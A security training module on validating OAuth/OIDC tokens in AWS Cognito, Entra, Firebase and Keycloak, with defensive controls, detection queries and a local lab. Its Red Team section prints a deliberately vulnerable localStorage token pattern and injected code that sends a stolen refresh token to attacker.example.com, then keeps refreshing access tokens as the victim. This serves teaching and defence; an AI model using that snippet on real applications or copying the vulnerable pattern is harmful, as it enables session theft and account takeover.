# 03 — OAuth, OIDC, and JWT in Cloud

> **Level:** Advanced
> **Prereqs:** `../IAM/authn-flows-and-tokens.md`, `api-gateway-and-edge-patterns.md`
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Credential Access, Persistence, Privilege Escalation
> **Authorization scope:** Test token flows only against IdPs you own (Keycloak dev on localhost, sandbox Cognito user pools, test Entra tenants). Never replay tokens from production IdPs.

## What & why

Cloud-native apps delegate authentication to managed IdPs via OAuth 2.0 / OpenID Connect. A single mistake in token validation — wrong audience, skipped expiry, missing issuer check — gives an attacker with any valid token from the IdP access to your application.

## The OnPrem reality

SAML 2.0 with long-lived, base64-decoded assertions. Replay attacks were possible when `NotOnOrAfter` was generous and SPs didn't check `InResponseTo`. OIDC fixed replays with short-lived ID tokens (`exp`) and signed JWTs, but introduced new failure modes in code.

## Core concepts

### Token types

| Token | Issued To | Audience | Lifetime | Storage rule |
|---|---|---|---|---|
| ID Token (JWT) | Client app (SPA/native) | Client ID | ~5-15 min | Transient (memory only) |
| Access Token (opaque or JWT) | Client app | Resource server (API) | ~1 hr | Transient; sent as Bearer |
| Refresh Token | Client app (confidential) | Token endpoint | Days/weeks | Server-side only; httpOnly cookie |
| IdP Session Cookie | Browser | IdP host only | Session | httpOnly, Secure, SameSite |

### Mandatory validation steps (resource server)

Every API endpoint receiving a Bearer token must verify:

1. **Signature** — against JWKS endpoint of issuer
2. **Issuer (`iss`)** — exact match (no trailing `/`)
3. **Audience (`aud`)** — must contain this API's identifier
4. **Expiry (`exp`)** — `iat + max_age` window
5. **Scope (`scp` / `scope`)** — contains required permission
6. **Not-Before (`nbf`)** — if present
7. **Clock skew** — allow ≤ 30 seconds tolerance

### Per-cloud IdP options

| Capability | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| Hosted IdP | Cognito User Pools | Entra External ID / B2C | Identity Platform (Firebase Auth) | Keycloak |
| OIDC Discovery | `https://cognito-idp.<region>.amazonaws.com/<pool-id>/.well-known/openid-configuration` | `https://login.microsoftonline.com/<tenant-id>/v2.0/.well-known/openid-configuration` | `https://securetoken.google.com/<project-id>` | `https://keycloak.localhost:8443/realms/<realm>/.well-known/openid-configuration` |
| Client/App config | App Client (in User Pool) | App Registration | Firebase App / OAuth client | Client in realm |
| Token signing | RS256 (JWKS published) | RS256 (JWKS published) | RS256 (Google's keys) | RS256/ES256 configurable |
| Refresh rotation | Built-in (refresh token rotation) | Continuous access evaluation (CAE) | Firebase refresh rotation | Configurable via realm settings |

## AWS — Cognito resource-server validation (Node.js)

```javascript
const jwksClient = require('jwks-rsa');
const jwt = require('jsonwebtoken');

const client = jwksClient({
  jwksUri: 'https://cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEf123/.well-known/jwks.json'
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    callback(null, key.getPublicKey());
  });
}

function validateToken(token) {
  return new Promise((resolve, reject) => {
    jwt.verify(token, getKey, {
      issuer: 'https://cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEf123',
      audience: '3qrstuvwxyz1234567890abc',
      algorithms: ['RS256'],
      clockTolerance: 30,
      maxAge: '1h'
    }, (err, decoded) => {
      if (err) return reject(err);

      if (decoded.token_use !== 'access') {
        return reject(new Error('Not an access token'));
      }

      const requiredScope = 'users-api/read';
      if (!decoded.scope || !decoded.scope.split(' ').includes(requiredScope)) {
        return reject(new Error('Missing required scope'));
      }

      resolve(decoded);
    });
  });
}
```

## Azure — Entra token validation (Python)

```python
import jwt
from jwt import PyJWKClient
import time

jwks_url = "https://login.microsoftonline.com/11111111-1111-1111-1111-111111111111/discovery/v2.0/keys"
issuer = "https://login.microsoftonline.com/11111111-1111-1111-1111-111111111111/v2.0"
audience = "api://11111111-1111-1111-1111-111111111111"

jwks_client = PyJWKClient(jwks_url, cache_keys=True)

def validate_entra_token(token: str):
    signing_key = jwks_client.get_signing_key_from_jwt(token)

    claims = jwt.decode(
        token,
        signing_key.key,
        algorithms=["RS256"],
        audience=audience,
        issuer=issuer,
        options={
            "verify_exp": True,
            "verify_iat": True,
            "verify_nbf": True,
            "require": ["exp", "iat", "aud", "iss", "sub"]
        },
        leeway=30
    )

    required_scopes = {"Users.Read"}
    scp = claims.get("scp", "")
    token_scopes = set(scp.split())
    if not required_scopes.issubset(token_scopes):
        raise ValueError("Missing required scopes")

    return claims
```

## GCP — Identity Platform / Firebase token validation (Node.js)

```javascript
const admin = require('firebase-admin');
admin.initializeApp({
  credential: admin.credential.applicationDefault(),
  projectId: 'example-project'
});

async function validateFirebaseToken(idToken) {
  const decoded = await admin.auth().verifyIdToken(idToken, true);
  // verifyIdToken checks: iss, aud, exp, iat, sub, signature against Google's JWKS

  // Additional: verify the intended audience is YOUR Firebase project
  if (decoded.aud !== 'example-project') {
    throw new Error('Wrong audience');
  }

  // Check custom claims for authorization
  if (!decoded.role || decoded.role !== 'admin') {
    throw new Error('Insufficient role');
  }

  return decoded;
}
```

## OnPrem — Keycloak resource-server validation

```python
# OnPrem Keycloak — same OIDC flow, local dev
import requests
from jose import jwt
from jose.jwk import JWKSet

KEYCLOAK_URL = "http://localhost:8080/realms/example-realm"
jwks = JWKSet(requests.get(f"{KEYCLOAK_URL}/protocol/openid-connect/certs").json())

def validate_keycloak_token(token: str):
    # Decode header to get kid
    unverified = jwt.get_unverified_header(token)
    key = jwks[unverified["kid"]]

    claims = jwt.decode(
        token,
        key.to_dict(),
        algorithms=["RS256"],
        audience="example-api",
        issuer=f"{KEYCLOAK_URL}",
        options={"verify_exp": True, "verify_aud": True, "verify_iat": True},
        leeway=30
    )

    # Scope check (Keycloak puts scopes in 'scope' claim, space-separated)
    if "read:users" not in claims.get("scope", "").split():
        raise ValueError("Missing required scope")

    return claims
```

## 🔴 Red Team view

### Attack: Refresh-token theft from SPA local storage

**Setup:** A React SPA stores the refresh token in `localStorage` after OAuth2 code+PKCE flow. A third-party NPM dependency (or XSS) reads `localStorage` and exfiltrates it.

```
// Vulnerable SPA code — DO NOT DO THIS
async function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');

  const resp = await fetch('https://cognito-idp.us-east-1.amazonaws.com/oauth2/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      client_id: '3qrstuvwxyz...',
      code: code,
      redirect_uri: 'https://example.com/callback'
    })
  });

  const tokens = await resp.json();
  // VULNERABLE: refresh token in localStorage accessible to any JS on the page
  localStorage.setItem('refresh_token', tokens.refresh_token);
  localStorage.setItem('access_token', tokens.access_token);
}

// Attacker's injected code (XSS or malicious dependency):
const stolenRefresh = localStorage.getItem('refresh_token');
fetch('https://attacker.example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ token: stolenRefresh })
});

// Attacker now silently refreshes the access token indefinitely:
setInterval(async () => {
  const resp = await fetch('https://cognito-idp.us-east-1.amazonaws.com/oauth2/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      client_id: '3qrstuvwxyz...',
      refresh_token: stolenRefresh
    })
  });
  const fresh = await resp.json();
  // Use fresh.access_token to call the API as the victim
}, 300000);
```

**Artifacts:**
- IdP token endpoint logs showing refresh_token grant from a new IP address.
- Multiple `access_token` issuances without an `authorization_code` grant preceding them.
- User agent / IP mismatch between initial login and subsequent refreshes.

## 🔵 Blue Team view

### Prevention: Refresh-token rotation (RFC 6749 + OAuth 2.0 Security BCP)

| Control | AWS Cognito | Azure Entra | GCP Identity Platform | OnPrem Keycloak |
|---|---|---|---|---|
| Refresh token rotation | Built-in — each use invalidates old token | CAE — token bound to IP/location | Firebase: refresh rotation on use | Realm settings → Revoke Refresh Token = ON |
| Server-side session (httpOnly cookie) | Cognito hosted UI session cookie | Entra session cookie | Firebase Auth SDK handles session | Keycloak `KEYCLOAK_SESSION` cookie |
| DPoP (mTLS-bound) | (as of June 2026, Cognito does not support DPoP natively) | (as of June 2026, Entra CAE offers similar token binding via IP/device signals but not full DPoP) | (as of June 2026, Google supports DPoP via OAuth 2.0 protected resource metadata for some services) | Keycloak 22+ supports DPoP preview |
| Token lifetime clamping | Access: 5 min; Refresh: 30 min (customizable) | Access: 5-60 min (configurable via token lifetime policy) | Firebase ID token: 1 hr (fixed) | Configurable per client: Access 5 min, Refresh 30 min |
| Risky sign-in detection | Cognito advanced security features (adaptive auth) | Entra Identity Protection (risky sign-in alerts) | Firebase Auth blocking functions | Keycloak with external SIEM integration |

### Server-side token storage pattern

```python
# Flask backend: store refresh token in httpOnly, Secure, SameSite cookie
from flask import Flask, request, make_response
import secrets

app = Flask(__name__)

@app.route('/api/auth/callback')
def callback():
    code = request.args.get('code')
    # Exchange code for tokens at IdP (server-to-server)
    tokens = exchange_code(code)

    # Create a server-side session
    session_id = secrets.token_urlsafe(32)
    store_session(session_id, {
        'refresh_token': tokens['refresh_token'],
        'access_token': tokens['access_token'],
        'sub': tokens['id_token_claims']['sub']
    })

    resp = make_response({'status': 'ok'})
    resp.set_cookie(
        'session_id', session_id,
        httponly=True,
        secure=True,
        samesite='Strict',
        max_age=3600
    )
    return resp

@app.route('/api/users/me')
def get_user():
    session_id = request.cookies.get('session_id')
    session = get_session(session_id)
    if not session:
        return {'error': 'Unauthorized'}, 401
    # Use session['access_token'] to fetch user data
    # NEVER expose refresh_token or access_token to browser JavaScript
```

### Detection queries

**Signal: Refresh token used from new IP**

| Cloud | Source | Query |
|---|---|---|
| AWS | CloudTrail (Cognito) + Cognito CloudWatch logs | `eventSource = cognito-idp.amazonaws.com AND eventName = TokenRefresh AND sourceIPAddress NOT IN (known-ips)` |
| Azure | Entra sign-in logs | `SigninLogs \| where OperationName == "Refresh token" \| where IPAddress !in (trusted_ips) \| project TimeGenerated, UserPrincipalName, IPAddress` |
| GCP | Cloud Audit Logs (Identity Platform) | `protoPayload.methodName = "google.cloud.identitytoolkit.v1.AccountManagementService.RefreshToken" AND protoPayload.authenticationInfo.principalIp NOT IN ("...")` |

**Signal: Multiple refreshes without code grant**

| Cloud | Query sketch |
|---|---|
| AWS | Count `TokenRefresh` events per `userIdentity.principalId` in 1-hour window; alert if count > 5 and no preceding `InitiateAuth` (code grant) |
| Azure | `SigninLogs \| where OperationName in ("Refresh token", "Authorization code") \| summarize RefreshCount=countif(OperationName=="Refresh token"), CodeGrantCount=countif(OperationName=="Authorization code") by UserPrincipalName, bin(TimeGenerated, 1h) \| where RefreshCount > 5 and CodeGrantCount == 0` |

### Response steps

1. Revoke the user's refresh tokens immediately (Cognito: `AdminUserGlobalSignOut`; Entra: revoke refresh tokens; Keycloak: logout all sessions).
2. Force re-authentication for the affected user.
3. Audit the NPM dependency that caused the XSS or supply chain compromise.
4. Deploy CSP headers (strict `script-src`) to mitigate future XSS.

## Hands-on lab

1. Start Keycloak on localhost: `docker run -p 8080:8080 quay.io/keycloak/keycloak:latest start-dev`
2. Create a realm, client (confidential, PKCE), and a test user.
3. Write a minimal Node.js API that validates Keycloak tokens (using code path shown above).
4. Intentionally skip the `aud` check — confirm a token from another client is accepted.
5. Fix the validation and confirm rejection.

## References

- OAuth 2.0 Security Best Current Practice (BCP): https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
- RFC 6749 (OAuth 2.0): https://datatracker.ietf.org/doc/html/rfc6749
- RFC 7519 (JWT): https://datatracker.ietf.org/doc/html/rfc7519
- DPoP (RFC 9449): https://datatracker.ietf.org/doc/html/rfc9449
- Cross-ref: `../IAM/federation-sso-and-external-providers.md` for federation patterns.
- Cross-ref: `api-gateway-and-edge-patterns.md` for gateway-level JWT validation.
- Cross-ref: `../Secrets-KMS/secret-stores-per-cloud.md` for OAuth client secret storage.
